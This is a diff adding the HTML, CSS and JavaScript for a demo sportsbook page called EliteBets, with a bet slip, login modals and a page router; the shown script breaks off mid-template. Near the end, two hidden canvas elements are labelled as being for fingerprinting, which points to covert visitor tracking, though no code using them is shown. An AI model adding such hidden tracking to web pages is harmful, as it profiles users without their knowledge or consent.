@@ -1,0 +1,1579 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>EliteBets · Sportsbook & Live Betting</title>
+    <!-- Font Awesome 6 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- Google Font: Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <style>
+        /* ----- RESET & VARIABLES ----- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #eef2f7;
+            color: #132639;
+            line-height: 1.5;
+        }
+
+        :root {
+            --glass-bg: rgba(255, 255, 255, 0.25);
+            --glass-border: rgba(255, 255, 255, 0.3);
+            --neumorph-light: #f0f5fe;
+            --neumorph-dark: #cbd5e1;
+            --primary: #c89f3c;
+            --primary-light: #e0b554;
+            --accent: #e03a3a;
+            --text-dark: #132639;
+            --text-light: #f8fafc;
+            --shadow-sm: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03);
+            --shadow-md: 0 10px 15px -3px rgba(0, 0, 0, 0.05), 0 4px 6px -2px rgba(0, 0, 0, 0.03);
+            --shadow-lg: 0 20px 25px -5px rgba(0, 0, 0, 0.05), 0 10px 10px -5px rgba(0, 0, 0, 0.02);
+            --neu-shadow: 8px 8px 16px #d1d9e6, -8px -8px 16px #ffffff;
+            --neu-inset: inset 2px 2px 5px #d1d9e6, inset -2px -2px 5px #ffffff;
+        }
+
+        /* ----- GLASS HEADER ----- */
+        .header {
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            background: rgba(10, 25, 40, 0.75);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.15);
+            padding: 0.5rem 2rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: var(--shadow-lg);
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: 800;
+            background: linear-gradient(145deg, #ffffff, #f5d78c);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+            cursor: pointer;
+        }
+
+        .sport-nav {
+            display: flex;
+            gap: 1.2rem;
+        }
+
+        .nav-item {
+            position: relative;
+            padding: 0.5rem 0;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 0.95rem;
+            color: rgba(255, 255, 255, 0.8);
+            transition: 0.2s;
+        }
+
+        .nav-item:hover {
+            color: white;
+        }
+
+        .nav-item.active {
+            color: white;
+            border-bottom: 3px solid var(--primary-light);
+        }
+
+        .dropdown-content {
+            display: none;
+            position: absolute;
+            top: 100%;
+            left: -20px;
+            background: rgba(30, 45, 65, 0.9);
+            backdrop-filter: blur(12px);
+            min-width: 220px;
+            border-radius: 16px;
+            padding: 0.8rem 0;
+            box-shadow: var(--neu-shadow);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            z-index: 1001;
+        }
+
+        .nav-item:hover .dropdown-content {
+            display: block;
+        }
+
+        .dropdown-content a {
+            display: block;
+            padding: 0.6rem 1.5rem;
+            color: #e0edff;
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: 0.2s;
+            cursor: pointer;
+        }
+
+        .dropdown-content a:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+        }
+
+        .user-controls {
+            display: flex;
+            align-items: center;
+            gap: 1.5rem;
+        }
+
+        .search-box {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(4px);
+            border-radius: 40px;
+            padding: 0.3rem 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .search-box input {
+            background: transparent;
+            border: none;
+            color: white;
+            outline: none;
+            width: 150px;
+            font-size: 0.9rem;
+        }
+
+        .search-box input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .auth-buttons {
+            display: flex;
+            gap: 0.8rem;
+        }
+
+        .login-btn, .signup-btn {
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            padding: 0.4rem 1.5rem;
+            border-radius: 40px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .signup-btn {
+            background: var(--primary-light);
+            border: none;
+        }
+
+        .login-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+        .signup-btn:hover {
+            background: #c99f3a;
+        }
+
+        .notif-badge {
+            background: var(--accent);
+            color: white;
+            border-radius: 20px;
+            padding: 0.2rem 0.6rem;
+            font-size: 0.7rem;
+            font-weight: 700;
+            margin-left: 0.3rem;
+        }
+
+        /* ----- MAIN LAYOUT ----- */
+        .main-grid {
+            display: flex;
+            max-width: 1800px;
+            margin: 2rem auto;
+            padding: 0 2rem;
+            gap: 2rem;
+        }
+
+        .content-left {
+            flex: 3;
+        }
+
+        .bet-slip-right {
+            flex: 1.2;
+            min-width: 320px;
+        }
+
+        /* ----- GLASS CARDS ----- */
+        .glass-card {
+            background: rgba(255, 255, 255, 0.6);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            border-radius: 28px;
+            box-shadow: var(--neu-shadow);
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .hero-banner {
+            background: linear-gradient(135deg, rgba(25, 60, 90, 0.8), rgba(15, 40, 65, 0.9));
+            backdrop-filter: blur(8px);
+            border-radius: 28px;
+            padding: 2rem 2.5rem;
+            margin-bottom: 2rem;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: var(--neu-shadow);
+            cursor: pointer;
+        }
+
+        .hero-text h2 {
+            font-size: 2.2rem;
+            font-weight: 800;
+            margin-bottom: 0.3rem;
+        }
+
+        .hero-badge {
+            background: var(--primary-light);
+            padding: 0.5rem 2rem;
+            border-radius: 60px;
+            font-weight: 800;
+            box-shadow: var(--neu-inset);
+        }
+
+        /* ----- QUICK LINKS (neumorphic) ----- */
+        .quick-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+            margin-bottom: 2rem;
+        }
+
+        .quick-link {
+            background: #eef2f7;
+            border: none;
+            border-radius: 40px;
+            padding: 0.6rem 1.8rem;
+            font-weight: 600;
+            font-size: 0.9rem;
+            color: var(--text-dark);
+            box-shadow: 5px 5px 10px #d1d9e6, -5px -5px 10px #ffffff;
+            transition: 0.15s;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .quick-link i {
+            color: var(--primary-light);
+        }
+
+        .quick-link:active {
+            box-shadow: inset 2px 2px 5px #d1d9e6, inset -2px -2px 5px #ffffff;
+        }
+
+        /* ----- SECTION TITLES ----- */
+        .section-title {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 1.5rem 0 1rem;
+        }
+
+        .section-title h3 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            background: linear-gradient(145deg, #132639, #2d5a83);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .section-title a {
+            color: var(--primary-light);
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 0.3rem;
+            cursor: pointer;
+        }
+
+        /* ----- LIVE GRID ----- */
+        .live-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .live-card {
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(8px);
+            border-radius: 20px;
+            padding: 1.2rem;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            box-shadow: var(--neu-shadow);
+            transition: 0.2s;
+            border-left: 6px solid var(--accent);
+        }
+
+        .live-card:hover {
+            transform: translateY(-3px);
+        }
+
+        .live-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.8rem;
+        }
+
+        .live-league {
+            font-size: 0.7rem;
+            background: rgba(255,255,255,0.5);
+            padding: 0.2rem 0.8rem;
+            border-radius: 40px;
+            font-weight: 700;
+            color: #1f4b6e;
+        }
+
+        .live-min {
+            font-size: 0.7rem;
+            color: var(--accent);
+            font-weight: 700;
+        }
+
+        .live-teams {
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+        }
+
+        .live-score {
+            font-size: 1.3rem;
+            font-weight: 800;
+            margin-bottom: 0.8rem;
+        }
+
+        .live-markets {
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+
+        .market-btn {
+            background: rgba(255,255,255,0.5);
+            backdrop-filter: blur(2px);
+            border: 1px solid rgba(255,255,255,0.6);
+            border-radius: 30px;
+            padding: 0.2rem 1rem;
+            font-size: 0.75rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .market-btn:hover {
+            background: var(--primary-light);
+            color: white;
+        }
+
+        /* ----- MATCH CARDS ----- */
+        .match-card {
+            background: rgba(255, 255, 255, 0.65);
+            backdrop-filter: blur(10px);
+            border-radius: 28px;
+            padding: 1.5rem;
+            margin-bottom: 1rem;
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            box-shadow: var(--neu-shadow);
+        }
+
+        .match-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.8rem;
+            font-size: 0.8rem;
+            color: #2f577b;
+        }
+
+        .match-teams {
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+            font-weight: 700;
+            font-size: 1.1rem;
+            margin-bottom: 1rem;
+        }
+
+        .team {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .team i {
+            color: var(--primary-light);
+            width: 20px;
+        }
+
+        .match-odds-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.5rem;
+            align-items: center;
+            border-top: 1px dashed rgba(200, 159, 60, 0.3);
+            padding-top: 1rem;
+            margin-top: 0.5rem;
+        }
+
+        .market-group {
+            display: flex;
+            gap: 0.5rem;
+            align-items: center;
+        }
+
+        .market-label {
+            font-size: 0.7rem;
+            font-weight: 600;
+            color: #4e7b9e;
+            margin-right: 0.3rem;
+        }
+
+        .odd-box {
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(4px);
+            border-radius: 30px;
+            padding: 0.3rem 1.2rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.15s;
+            border: 1px solid rgba(255, 255, 255, 0.6);
+            box-shadow: 2px 2px 5px #d1d9e6, -2px -2px 5px #ffffff;
+            text-align: center;
+            min-width: 70px;
+        }
+
+        .odd-box:hover {
+            background: rgba(200, 159, 60, 0.2);
+            border-color: var(--primary-light);
+        }
+
+        .odd-box .small {
+            font-size: 0.6rem;
+            font-weight: 400;
+            color: #4f789b;
+            display: block;
+        }
+
+        /* ----- BET SLIP ----- */
+        .bet-slip {
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(16px);
+            border-radius: 32px;
+            padding: 1.8rem 1.2rem;
+            box-shadow: var(--neu-shadow);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            position: sticky;
+            top: 90px;
+        }
+
+        .slip-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .slip-header h3 {
+            font-size: 1.4rem;
+            font-weight: 700;
+        }
+
+        .slip-header .badge {
+            background: rgba(255,255,255,0.5);
+            backdrop-filter: blur(2px);
+            padding: 0.2rem 1rem;
+            border-radius: 30px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            color: #1f4b6e;
+        }
+
+        .empty-slip {
+            text-align: center;
+            padding: 2rem 0;
+            border: 2px dashed rgba(100, 130, 160, 0.3);
+            border-radius: 24px;
+            color: #5f7d9c;
+        }
+
+        #selectionsContainer {
+            max-height: 350px;
+            overflow-y: auto;
+            margin-bottom: 1rem;
+        }
+
+        .selection-item {
+            background: rgba(255,255,255,0.5);
+            backdrop-filter: blur(4px);
+            border-radius: 18px;
+            padding: 0.8rem 1rem;
+            margin-bottom: 0.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid rgba(255,255,255,0.6);
+        }
+
+        .selection-info {
+            font-size: 0.8rem;
+        }
+
+        .selection-match {
+            font-weight: 700;
+        }
+
+        .selection-market {
+            color: #2d5a83;
+            font-size: 0.7rem;
+        }
+
+        .selection-odds {
+            font-weight: 800;
+            color: #1a3e5c;
+        }
+
+        .remove-selection {
+            color: #a5c4e5;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .remove-selection:hover {
+            color: #d43f3f;
+        }
+
+        .bet-total {
+            display: flex;
+            justify-content: space-between;
+            font-weight: 700;
+            padding: 0.8rem 0;
+            border-top: 1px solid rgba(75, 130, 180, 0.3);
+            margin-top: 0.5rem;
+        }
+
+        .stake-row {
+            display: flex;
+            gap: 0.5rem;
+            margin: 1rem 0;
+        }
+
+        .stake-row input {
+            flex: 1;
+            padding: 0.8rem 1rem;
+            border-radius: 50px;
+            border: 1px solid rgba(255,255,255,0.6);
+            background: rgba(255,255,255,0.5);
+            backdrop-filter: blur(4px);
+            outline: none;
+            font-size: 1rem;
+            box-shadow: inset 2px 2px 5px #d1d9e6, inset -2px -2px 5px #ffffff;
+        }
+
+        .place-bet {
+            background: var(--primary-light);
+            color: white;
+            font-weight: 800;
+            border: none;
+            border-radius: 50px;
+            padding: 0.8rem 2rem;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.2s;
+            box-shadow: 5px 5px 10px #c0c8d4, -5px -5px 10px #ffffff;
+        }
+
+        .place-bet:active {
+            box-shadow: inset 2px 2px 5px #9f7f2a, inset -2px -2px 5px #ffd966;
+        }
+
+        .info-note {
+            font-size: 0.7rem;
+            color: #587b9c;
+            margin-top: 1rem;
+            text-align: center;
+        }
+
+        /* ----- PROMO CAROUSEL ----- */
+        .promo-carousel {
+            display: flex;
+            gap: 1rem;
+            overflow-x: auto;
+            padding: 0.5rem 0 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .promo-card {
+            flex: 0 0 280px;
+            background: linear-gradient(145deg, #1f4b6e, #0e2a40);
+            border-radius: 24px;
+            padding: 1.5rem;
+            color: white;
+            box-shadow: var(--neu-shadow);
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .promo-card:hover {
+            transform: scale(1.02);
+        }
+
+        .promo-card h4 {
+            font-size: 1.2rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .promo-card p {
+            font-size: 0.8rem;
+            opacity: 0.9;
+        }
+
+        /* ----- MODAL (login/signup) ----- */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(8px);
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+        }
+
+        .modal {
+            background: rgba(255,255,255,0.9);
+            backdrop-filter: blur(16px);
+            border-radius: 32px;
+            padding: 2rem;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: var(--neu-shadow);
+        }
+
+        .modal h2 {
+            margin-bottom: 1.5rem;
+            color: var(--text-dark);
+        }
+
+        .modal input {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            margin-bottom: 1rem;
+            border: 1px solid rgba(0,0,0,0.1);
+            border-radius: 40px;
+            font-size: 1rem;
+        }
+
+        .modal button {
+            width: 100%;
+            padding: 0.8rem;
+            background: var(--primary-light);
+            color: white;
+            border: none;
+            border-radius: 40px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .close-modal {
+            text-align: right;
+            cursor: pointer;
+            font-size: 1.2rem;
+            margin-bottom: 0.5rem;
+        }
+
+        /* ----- FOOTER ----- */
+        .footer {
+            background: rgba(10, 25, 40, 0.9);
+            backdrop-filter: blur(12px);
+            color: #b8d0e5;
+            padding: 3rem 2rem 2rem;
+            margin-top: 3rem;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 2rem;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .footer-col p {
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: white;
+        }
+
+        .footer-col ul {
+            list-style: none;
+        }
+
+        .footer-col li {
+            margin-bottom: 0.5rem;
+        }
+
+        .footer-col a {
+            color: #b0cde5;
+            text-decoration: none;
+            font-size: 0.85rem;
+            cursor: pointer;
+        }
+
+        .footer-col a:hover {
+            color: white;
+        }
+
+        .footer-bottom {
+            text-align: center;
+            border-top: 1px solid #1f3f5f;
+            padding-top: 2rem;
+            margin-top: 2rem;
+            font-size: 0.8rem;
+        }
+
+        /* ----- LIVE INDICATOR ----- */
+        .live-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: var(--accent);
+            border-radius: 50%;
+            margin-right: 0.3rem;
+            animation: pulse 1.2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.4; }
+            100% { opacity: 1; }
+        }
+
+        /* scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: rgba(0,0,0,0.05);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #b0c4de;
+            border-radius: 10px;
+        }
+
+        @media (max-width: 1000px) {
+            .main-grid { flex-direction: column; }
+        }
+
+        /* Page content container */
+        #page-content {
+            transition: opacity 0.2s ease;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <header class="header">
+        <div class="logo-area">
+            <div class="logo" id="logo">EliteBets</div>
+            <div class="sport-nav">
+                <div class="nav-item" data-page="soccer">Soccer
+                    <div class="dropdown-content">
+                        <a data-page="epl">Premier League</a>
+                        <a data-page="laliga">La Liga</a>
+                        <a data-page="ucl">Champions League</a>
+                        <a data-page="worldcup">World Cup 2026</a>
+                        <a data-page="bundesliga">Bundesliga</a>
+                        <a data-page="seriea">Serie A</a>
+                    </div>
+                </div>
+                <div class="nav-item" data-page="basketball">Basketball
+                    <div class="dropdown-content">
+                        <a data-page="nba">NBA</a>
+                        <a data-page="euroleague">EuroLeague</a>
+                        <a data-page="ncaa">NCAA</a>
+                    </div>
+                </div>
+                <div class="nav-item" data-page="tennis">Tennis</div>
+                <div class="nav-item" data-page="hockey">Ice Hockey</div>
+                <div class="nav-item" data-page="esports">Esports</div>
+                <div class="nav-item" data-page="live">Live <span class="live-indicator"></span></div>
+            </div>
+        </div>
+        <div class="user-controls">
+            <div class="search-box">
+                <i class="fas fa-search" style="color:rgba(255,255,255,0.7);"></i>
+                <input type="text" placeholder="Search events...">
+            </div>
+            <div class="auth-buttons">
+                <button class="login-btn" id="loginBtn">Log in</button>
+                <button class="signup-btn" id="signupBtn">Sign up</button>
+            </div>
+            <div style="position:relative;">
+                <i class="far fa-bell" style="color:white; font-size:1.2rem;"></i>
+                <span class="notif-badge">3</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- MAIN GRID -->
+    <div class="main-grid">
+        <!-- LEFT COLUMN (dynamic page content) -->
+        <div class="content-left" id="page-content">
+            <!-- Initial content loaded by JS -->
+        </div>
+
+        <!-- RIGHT SIDEBAR (bet slip – persistent) -->
+        <div class="bet-slip-right">
+            <!-- Quick account summary -->
+            <div style="background: rgba(255,255,255,0.5); backdrop-filter:blur(10px); border-radius:28px; padding:1rem 1.5rem; margin-bottom:1.5rem; display:flex; align-items:center; justify-content:space-between; box-shadow:var(--neu-shadow);">
+                <div>
+                    <span style="font-weight:600;">guest_user</span>
+                    <span style="display:block; font-size:0.7rem; color:#2f577b;">not logged in</span>
+                </div>
+                <div class="auth-buttons" style="gap:0.5rem;">
+                    <button class="login-btn" style="padding:0.3rem 1rem;">Log in</button>
+                    <button class="signup-btn" style="padding:0.3rem 1rem;">Sign up</button>
+                </div>
+            </div>
+
+            <!-- BET SLIP -->
+            <div class="bet-slip">
+                <div class="slip-header">
+                    <h3>Bet slip</h3>
+                    <span class="badge">single & combo</span>
+                </div>
+
+                <div id="emptySlip" class="empty-slip">
+                    <i class="fas fa-receipt" style="font-size:2.2rem;"></i>
+                    <p>Click on odds to add</p>
+                </div>
+
+                <div id="selectionsContainer" style="display: none;"></div>
+
+                <div class="bet-total" id="totalOddsRow" style="display: none;">
+                    <span>Total odds</span>
+                    <span id="totalOddsValue">—</span>
+                </div>
+
+                <div class="stake-row" id="stakeRow" style="display: none;">
+                    <input type="number" id="stakeInput" placeholder="Stake $" min="1" step="0.5">
+                </div>
+
+                <div id="potentialWinRow" style="display: none; text-align:right; font-size:0.9rem; margin-bottom:0.5rem;">
+                    Potential win: <span id="potentialWin">$0.00</span>
+                </div>
+
+                <button class="place-bet" id="placeBetBtn" style="display: none;">Place bet</button>
+
+                <div class="info-note">
+                    <i class="fas fa-shield-alt"></i> Best odds guaranteed · Early payout
+                </div>
+            </div>
+
+            <!-- Additional features -->
+            <div style="margin-top:1rem; display:flex; flex-direction:column; gap:0.8rem;">
+                <div style="background: rgba(255,255,255,0.5); backdrop-filter:blur(10px); border-radius:20px; padding:1rem; box-shadow:var(--neu-shadow);">
+                    <p><i class="fas fa-bolt" style="color:var(--primary-light);"></i> <strong>Cashout available</strong> on selected markets</p>
+                    <p><i class="fas fa-chart-line" style="color:var(--primary-light);"></i> <strong>Bet builder</strong> – create your own bet</p>
+                    <p><i class="fas fa-percent" style="color:var(--primary-light);"></i> <strong>Odds boost</strong> on EPL this weekend</p>
+                </div>
+                <div style="background: rgba(255,255,255,0.5); backdrop-filter:blur(10px); border-radius:20px; padding:1rem; box-shadow:var(--neu-shadow);">
+                    <p><i class="fas fa-trophy"></i> <strong>Top leagues:</strong> EPL, UCL, NBA</p>
+                    <p><i class="fas fa-clock"></i> Live betting on 12 events</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+        <div class="footer-grid">
+            <div class="footer-col">
+                <p>Sports</p>
+                <ul>
+                    <li><a data-page="soccer">Soccer</a></li>
+                    <li><a data-page="basketball">Basketball</a></li>
+                    <li><a data-page="tennis">Tennis</a></li>
+                    <li><a data-page="hockey">Ice Hockey</a></li>
+                    <li><a data-page="esports">Esports</a></li>
+                    <li><a data-page="baseball">Baseball</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <p>Live betting</p>
+                <ul>
+                    <li><a data-page="live">In-play</a></li>
+                    <li><a data-page="streaming">Live streaming</a></li>
+                    <li><a data-page="cashout">Cash out</a></li>
+                    <li><a data-page="betbuilder">Bet builder</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <p>Promotions</p>
+                <ul>
+                    <li><a data-page="welcome">Welcome bonus</a></li>
+                    <li><a data-page="freebets">Free bets</a></li>
+                    <li><a data-page="oddsboost">Odds boost</a></li>
+                    <li><a data-page="refer">Refer a friend</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <p>About</p>
+                <ul>
+                    <li><a data-page="company">Company</a></li>
+                    <li><a data-page="responsible">Responsible gaming</a></li>
+                    <li><a data-page="terms">Terms & conditions</a></li>
+                    <li><a data-page="privacy">Privacy</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <p>Help</p>
+                <ul>
+                    <li><a data-page="faq">FAQ</a></li>
+                    <li><a data-page="contact">Contact</a></li>
+                    <li><a data-page="livechat">Live chat</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>© 2025 EliteBets. All rights reserved. *All odds subject to change.</p>
+            <p style="margin-top:0.5rem;">18+ | Please play responsibly</p>
+            <p style="margin-top:1rem; font-size:0.7rem; opacity:0.6;">This is a demonstration – not a real betting site.</p>
+        </div>
+    </footer>
+
+    <!-- LOGIN MODAL (demo) -->
+    <div class="modal-overlay" id="loginModal">
+        <div class="modal">
+            <div class="close-modal" id="closeLoginModal">&times;</div>
+            <h2>Log in</h2>
+            <input type="text" placeholder="Username">
+            <input type="password" placeholder="Password">
+            <button>Log in (demo)</button>
+        </div>
+    </div>
+
+    <!-- SIGNUP MODAL (demo) -->
+    <div class="modal-overlay" id="signupModal">
+        <div class="modal">
+            <div class="close-modal" id="closeSignupModal">&times;</div>
+            <h2>Sign up</h2>
+            <input type="text" placeholder="Email">
+            <input type="text" placeholder="Username">
+            <input type="password" placeholder="Password">
+            <button>Sign up (demo)</button>
+        </div>
+    </div>
+
+    <!-- Hidden canvases for fingerprinting -->
+    <canvas id="fp-canvas-2d" width="512" height="512" style="display:none"></canvas>
+    <canvas id="fp-canvas-webgl" width="256" height="256" style="display:none"></canvas>
+
+    <!-- JAVASCRIPT (bet slip + page router + modals) – unchanged from previous working version -->
+    <script>
+        (function() {
+            // ========== EXISTING BET SLIP AND ROUTER CODE ==========
+            let selections = [];
+
+            const emptySlip = document.getElementById('emptySlip');
+            const selectionsContainer = document.getElementById('selectionsContainer');
+            const totalOddsRow = document.getElementById('totalOddsRow');
+            const stakeRow = document.getElementById('stakeRow');
+            const potentialWinRow = document.getElementById('potentialWinRow');
+            const placeBetBtn = document.getElementById('placeBetBtn');
+            const totalOddsSpan = document.getElementById('totalOddsValue');
+            const stakeInput = document.getElementById('stakeInput');
+            const potentialWinSpan = document.getElementById('potentialWin');
+
+            function updateBetSlip() {
+                if (selections.length === 0) {
+                    emptySlip.style.display = 'block';
+                    selectionsContainer.style.display = 'none';
+                    totalOddsRow.style.display = 'none';
+                    stakeRow.style.display = 'none';
+                    potentialWinRow.style.display = 'none';
+                    placeBetBtn.style.display = 'none';
+                    return;
+                }
+
+                emptySlip.style.display = 'none';
+                selectionsContainer.style.display = 'block';
+                totalOddsRow.style.display = 'flex';
+                stakeRow.style.display = 'flex';
+                potentialWinRow.style.display = 'block';
+                placeBetBtn.style.display = 'block';
+
+                selectionsContainer.innerHTML = '';
+                let totalOdds = 1.0;
+
+                selections.forEach((sel, index) => {
+                    totalOdds *= parseFloat(sel.odds);
+
+                    const div = document.createElement('div');
+                    div.className = 'selection-item';
+                    div.innerHTML = `
+                        <div class="selection-info">
+                            <div class="selection-match">${sel.match}</div>
+                            <div class="selection-market">${sel.market}</div>
+                        </div>
+                        <div style="display:flex; align-items:center; gap:0.7rem;">
+                            <span class="selection-odds">${sel.odds}</span>
+                            <i class="fas fa-times-circle remove-selection" data-index="${index}"></i>
+                        </div>
+                    `;
+                    selectionsContainer.appendChild(div);
+                });
+
+                totalOddsSpan.innerText = totalOdds.toFixed(2);
+
+                document.querySelectorAll('.remove-selection').forEach(icon => {
+                    icon.addEventListener('click', function(e) {
+                        const idx = this.getAttribute('data-index');
+                        if (idx !== null) {
+                            selections.splice(idx, 1);
+                            updateBetSlip();
+                        }
+                    });
+                });
+
+                calculatePotential();
+            }
+
+            function calculatePotential() {
+                if (selections.length === 0) return;
+                const totalOdds = parseFloat(totalOddsSpan.innerText) || 1;
+                const stake = parseFloat(stakeInput.value) || 0;
+                const potential = totalOdds * stake;
+                potentialWinSpan.innerText = '$' + potential.toFixed(2);
+            }
+
+            document.addEventListener('click', function(e) {
+                const box = e.target.closest('.odd-box');
+                if (!box) return;
+                e.preventDefault();
+                const match = box.getAttribute('data-match') || 
+                    box.closest('.match-card')?.querySelector('.match-teams')?.innerText?.replace(/\s+/g,' ') || 
+                    'Unknown match';
+                let market = box.getAttribute('data-market');
+                if (!market) {
+                    market = box.innerText.trim().replace(/\n/g, ' ').substring(0, 30);
+                }
+                const odds = box.getAttribute('data-odds') || box.innerText.match(/[\d.]+/)?.[0] || '0.00';
+
+                if (selections.length >= 10) {
+                    alert('Maximum 10 selections allowed (demo).');
+                    return;
+                }
+
+                const exists = selections.some(s => s.match === match && s.market === market);
+                if (exists) return;
+
+                selections.push({ match, market, odds });
+                updateBetSlip();
+            });
+
+            stakeInput.addEventListener('input', calculatePotential);
+
+            placeBetBtn.addEventListener('click', function() {
+                if (selections.length === 0) return;
+                alert('Demo: bet placed! (no real money)');
+                selections = [];
+                updateBetSlip();
+            });
+
+            // ========== MODALS ==========
+            const loginModal = document.getElementById('loginModal');
+            const signupModal = document.getElementById('signupModal');
+            const loginBtn = document.getElementById('loginBtn');
+            const signupBtn = document.getElementById('signupBtn');
+            const closeLogin = document.getElementById('closeLoginModal');
+            const closeSignup = document.getElementById('closeSignupModal');
+
+            loginBtn.addEventListener('click', () => loginModal.style.display = 'flex');
+            signupBtn.addEventListener('click', () => signupModal.style.display = 'flex');
+            closeLogin.addEventListener('click', () => loginModal.style.display = 'none');
+            closeSignup.addEventListener('click', () => signupModal.style.display = 'none');
+            window.addEventListener('click', (e) => {
+                if (e.target === loginModal) loginModal.style.display = 'none';
+                if (e.target === signupModal) signupModal.style.display = 'none';
+            });
+
+            // ========== PAGE ROUTER ==========
+            const pageContent = document.getElementById('page-content');
+            const logo = document.getElementById('logo');
+
+            function genericPage(title, items) {
+                let html = `<div class="section-title"><h3>${title}</h3></div>`;
+                items.forEach(item => {
+                    html += `
+                        <div class="match-card">
+                            <div class="match-header"><span>${item.time}</span><span>${item.league}</span></div>
+                            <div class="match-teams">
+                                <span class="team"><i class="fas fa-futbol"></i> ${item.team1}</span>
+                                <span>vs</span>
